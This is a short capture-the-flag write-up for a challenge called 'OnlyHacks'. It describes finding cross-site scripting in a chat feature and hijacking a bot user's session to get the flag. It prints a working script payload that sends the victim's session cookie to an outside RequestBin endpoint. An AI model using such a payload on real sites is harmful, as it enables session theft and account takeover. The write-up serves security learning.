# OnlyHacks
At the beginning of the challenge, I was required to create an account. Once registered, the application opened an automated chat with Renata. Since the chat reflected back my input, I tested for possible client-side injection. After a few attempts, I confirmed that the application was vulnerable to XSS, as shown below:
<img width="414" height="134" alt="image" src="https://github.com/user-attachments/assets/258af85a-bfc8-4074-bd5d-5fc381d2a554" />

After confirming the vulnerability, the next step was to determine whether I could exfiltrate Renata’s session cookie. To do this, I used RequestBin, which allowed me to capture outbound HTTP requests. I crafted the following payload to send Renata’s cookie to my controlled endpoint:```bash
```bash
<script>document.location="https://requestbin.whapi.cloud/16gnxcm1?inspect="+document.cookie</script>
```
<img width="761" height="313" alt="image" src="https://github.com/user-attachments/assets/549ab445-97e2-4101-bfba-fe902138e3fb" />

As soon as Renata’s client executed the payload, her session cookie was delivered to my RequestBin endpoint. With that cookie in hand, I replicated her session in my browser. This granted me access to privileged functionality, allowing me to retrieve the flag.
